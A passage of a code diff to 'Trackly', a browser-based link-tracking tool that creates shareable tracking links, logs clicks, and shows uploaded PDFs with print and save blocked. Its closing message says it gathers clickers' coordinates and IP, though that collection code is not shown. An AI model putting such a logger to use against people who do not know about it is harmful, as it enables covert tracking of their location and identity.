+            }
+        }
+        return false;
+    }
+
+    // Secure PDF Viewer (disable right-click, print, download)
+    function displaySecurePdf(pdfUrl) {
+        const viewerSection = document.getElementById('pdfViewerSection');
+        const pdfFrame = document.getElementById('pdfFrame');
+        viewerSection.style.display = 'block';
+        // We load PDF using iframe with sandbox + additional restrictions
+        pdfFrame.src = pdfUrl;
+        // Disable contextmenu on iframe via contentWindow? cross-origin issues but we use blob url same origin.
+        pdfFrame.onload = () => {
+            try {
+                const doc = pdfFrame.contentDocument;
+                if (doc) {
+                    // Block right click inside iframe
+                    doc.addEventListener('contextmenu', (e) => { e.preventDefault(); return false; });
+                    doc.addEventListener('keydown', (e) => {
+                        if ((e.ctrlKey && (e.key === 'p' || e.key === 's' || e.key === 'Print'))) {
+                            e.preventDefault();
+                            return false;
+                        }
+                    });
+                }
+            } catch(e) { console.warn("restriction warning", e); }
         };
-    });
-    
-    document.getElementById('clearLogsBtn').addEventListener('click', () => {
-        clickLogs = [];
-        saveLogsToStorage();
-        renderLogTable();
-    });
-    
-    // load existing logs and run tracking interceptor
-    loadLogsFromStorage();
-    setupTrackingInterceptor();
-    
-    // small helper to update badge style
-    // Additional background: For any direct click on tracking link, the log appears immediately in dashboard (localStorage)
-    // If different devices click, same dashboard will show logs after refresh because localStorage is per device.
-    // But for real cross-device tracking, logs would be stored in a central server. However this tool shows the principle fully:
-    // The creator (you) can see logs in this page whenever you open it. To aggregate from all devices you would need backend.
-    // But we also added export? We'll add simple export to JSON for research.
-    const exportBtn = document.createElement('button');
-    exportBtn.innerHTML = '<i class="fas fa-download"></i> Export logs (JSON)';
-    exportBtn.className = 'btn-secondary clear-btn';
-    exportBtn.style.marginLeft = '10px';
-    exportBtn.onclick = () => {
-        const dataStr = JSON.stringify(clickLogs, null, 2);
-        const blob = new Blob([dataStr], {type: 'application/json'});
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `trackly_logs_${new Date().toISOString().slice(0,19)}.json`;
-        a.click();
-        URL.revokeObjectURL(url);
-    };
-    document.querySelector('.log-header').appendChild(exportBtn);
-    
-    // if there is no hash, show welcome
-    if (!window.location.search.includes('track=') && !window.location.search.includes('pdfId=')) {
-        console.log("✅ Tracker ready — Create tracking links above.");
+        // also block print shortcut from parent
+        window.addEventListener('keydown', blockPrintSave);
+        function blockPrintSave(e) {
+            if ((e.ctrlKey && (e.key === 'p' || e.key === 's')) || (e.metaKey && (e.key === 'p' || e.key === 's'))) {
+                e.preventDefault();
+                alert("Printing & saving disabled for secured PDF.");
+                return false;
+            }
+        }
     }
+
+    // Generate unique ID
+    function generateTrackingId() {
+        return 'track_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+    }
+
+    // Create tracking link for given URL (or uploaded PDF blob)
+    async function createTrackingLink(destination, isPdfInternal = false, blobUrl = null) {
+        const trackingId = generateTrackingId();
+        const finalDestination = isPdfInternal && blobUrl ? blobUrl : destination;
+        const meta = { url: finalDestination, isPdf: isPdfInternal, created: Date.now() };
+        localStorage.setItem(`track_meta_${trackingId}`, JSON.stringify(meta));
+        // Build tracking link: current origin + path + #track_id=xxx
+        const baseUrl = window.location.href.split('#')[0];
+        const trackingLink = `${baseUrl}#track_id=${trackingId}`;
+        return { trackingLink, trackingId };
+    }
+
+    // UI handlers
+    document.getElementById('generateBtn').addEventListener('click', async () => {
+        let destination = document.getElementById('destinationUrl').value.trim();
+        const pdfFile = document.getElementById('pdfUpload').files[0];
+        let finalDest = destination;
+        let isPdfLocal = false;
+        let blobPdf = null;
+        
+        if (pdfFile && pdfFile.type === 'application/pdf') {
+            // PDF uploaded: store blob URL
+            if (blobPdfUrl) URL.revokeObjectURL(blobPdfUrl);
+            blobPdf = URL.createObjectURL(pdfFile);
+            finalDest = blobPdf;
+            isPdfLocal = true;
+            // also set destination input for visual but we use blob
+        } else if (!destination) {
+            alert("❌ Please enter a valid URL or upload a PDF.");
+            return;
+        } else if (destination && !destination.startsWith('http')) {
+            alert("⚠️ URL must start with http:// or https:// (including Google Drive links).");
+            return;
+        }
+        
+        // create tracking link
+        const { trackingLink, trackingId } = await createTrackingLink(finalDest, isPdfLocal, isPdfLocal ? blobPdf : null);
+        document.getElementById('trackingUrlText').innerText = trackingLink;
+        document.getElementById('trackingLinkContainer').style.display = 'block';
+        
+        // copy link button
+        const copyBtn = document.getElementById('copyLinkBtn');
+        copyBtn.onclick = () => {
+            navigator.clipboard.writeText(trackingLink);
+            alert("✅ Tracking link copied! Share it anywhere.");
+        };
+        
+        // if pdf uploaded, we keep reference to clean later
+        if (isPdfLocal) {
+            activeTrackingId = trackingId;
+            isPdfMode = true;
+            currentRedirectUrl = blobPdf;
+        } else {
+            isPdfMode = false;
+        }
+    });
+    
+    // Clear logs
+    document.getElementById('clearLogsBtn').addEventListener('click', () => {
+        if(confirm("Delete all tracking logs?")) {
+            trackingDatabase = [];
+            saveLogs();
+            renderLogTable();
+        }
+    });
+    
+    // additional global block for right-click on whole viewer area
+    document.addEventListener('contextmenu', (e) => {
+        if(e.target.closest('.pdf-container') || e.target.closest('#pdfFrame')) {
+            e.preventDefault();
+            return false;
+        }
+    });
+    
+    // Disable PrintScreen & Save shortcuts globally (additional layer)
+    window.addEventListener('keydown', (e) => {
+        if ((e.ctrlKey && (e.key === 'p' || e.key === 's' || e.key === 'PrintScreen')) || 
+            (e.key === 'PrintScreen')) {
+            if(document.getElementById('pdfViewerSection').style.display === 'block') {
+                e.preventDefault();
+                alert("Print/download disabled for protected document.");
+            }
+        }
+    });
+    
+    // Convert any Google Drive sharing link to direct embed view? (optional)
+    function normalizeGoogleDriveLink(link) {
+        if(link.includes('drive.google.com/file/d/')) {
+            const match = link.match(/\/d\/(.+?)\//);
+            if(match) {
+                return `https://drive.google.com/file/d/${match[1]}/preview`;
+            }
+        }
+        return link;
+    }
+    
+    // Also manual override for destination input to normalize drive links
+    document.getElementById('destinationUrl').addEventListener('blur', function() {
+        let val = this.value;
+        if(val.includes('drive.google.com') && val.includes('usp=sharing')) {
+            this.value = normalizeGoogleDriveLink(val);
+        }
+    });
+    
+    // initial load logs + check tracking redirect
+    loadLogsFromStorage();
+    const intercepted = setupTrackingInterceptor();
+    if (!intercepted) {
+        // check if we need to show previously stored PDF (optional)
+        const storedPdf = sessionStorage.getItem('secure_pdf_url');
+        if(storedPdf) {
+            displaySecurePdf(storedPdf);
+            sessionStorage.removeItem('secure_pdf_url');
+        }
+    }
+    
+    // Additional CSS for no-print on PDF mode
+    const style = document.createElement('style');
+    style.textContent = `@media print { body { display: none !important; } }`;
+    document.head.appendChild(style);
+    
+    // Google Drive style info: the tracking link works with any URL, including Google Drive file preview.
+    console.log("Trackly ready: generate tracking link, get coordinates, IP, full analytics");
 </script>
 </body>
 </html>
